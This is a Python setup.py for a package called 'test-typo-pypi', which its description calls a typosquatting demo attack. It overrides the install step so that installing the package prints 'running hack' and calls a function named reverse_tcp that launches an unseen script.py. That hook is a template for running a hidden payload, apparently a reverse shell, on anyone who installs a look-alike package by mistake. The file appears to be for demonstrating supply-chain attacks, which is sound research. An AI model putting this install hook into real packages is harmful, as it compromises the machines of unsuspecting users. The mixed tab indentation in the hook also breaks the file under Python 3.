#!/usr/bin/env python
from __future__ import print_function
import os



from setuptools import setup
from setuptools.command.develop import develop
from setuptools.command.install import install

long_description_filename = os.path.join(
    os.path.dirname(os.path.abspath(__file__)), 'README.md')

with open(long_description_filename) as fd:
    long_description = fd.read()




def reverse_tcp():
    import subprocess, sys
    p = subprocess.Popen([sys.executable, 'script.py'],
                     stdout=subprocess.PIPE,
                     stderr=subprocess.STDOUT)


class PostInstallCommand(install):
    def run(self):
        install.run(self)
	print("running hack")
	reverse_tcp()


setup(
    name='test-typo-pypi',
    version='1.1.11',
    description='Typosquating demo attack.',
    long_description=long_description,
    long_description_content_type='text/markdown',
    url='https://github.com/amboulouma/typosquating-demo',
    packages=[],
    license='GPLv3',
    classifiers=[
        'Environment :: Console',
        'License :: OSI Approved :: GNU General Public License v3 (GPLv3)',
        'Operating System :: MacOS :: MacOS X',
        'Operating System :: Microsoft :: Windows',
        'Operating System :: POSIX',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Topic :: Security',
    ],
    install_requires=[],
    tests_require=[],
    cmdclass={
        'install': PostInstallCommand,
    },
)
